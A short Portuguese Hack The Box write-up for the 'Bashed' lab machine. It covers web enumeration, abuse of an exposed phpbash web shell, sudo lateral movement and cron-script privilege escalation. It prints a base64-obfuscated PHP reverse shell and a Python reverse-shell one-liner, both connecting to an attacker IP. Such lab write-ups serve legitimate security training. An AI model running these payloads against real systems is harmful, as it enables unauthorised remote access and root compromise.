Enumeração dos serviços:
![[/Write-up/Hack The Box/Bashed/img/Pasted image 20240206110003.png]]
Enumeração de diretórios e arquivos:
```bash
feroxbuster -u http://10.10.10.68 -A -x txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404
```

Descoberta do arquivo `http://10.10.10.68/dev/phpbash.php` onde é possível executar comandos no servidor:
![[Pasted image 20240206111038.png]]
Vamos criar um arquivo em PHP que irá enviar a shell reversa para a máquina atacante dentro de `/var/www/html/uploads` e acessar o arquivo no endpoint `/uploads.shell.php`
```bash
echo PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcvMTIzNCAwPiYxJyIpOyA/Pgo= | base64 -d > shell.php
```
Ao rodar o comando `sudo -l` percebemos que o usuário `scriptmanager` tem permissão de sudo em todos os binários.
![[Pasted image 20240206131212.png]]![[Pasted image 20240206131216.png]]
Vamos então fazer a movimentação lateral com o comando: `sudo -u scriptmanager /bin/bash`.
![[Pasted image 20240206131306.png]]
Com o usuário scriptmanager, podemos procurar por arquivos que pertencem a esse usuário e encontramos o `test.py` dentro de `/scripts/test.py`
![[Pasted image 20240206131432.png]]
Analisando a pasta `/scripts` percebemos que o script roda periodicamente e cria um arquivo com permissões root dentro da mesma pasta.
Vamos então incluir uma linha no scrip que irá nos enviar a shell do root: 

```bash
echo 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' >> test.py
```
Aguardamos um pouco e recebemos a shell como root:
![[Pasted image 20240206162104.png]]
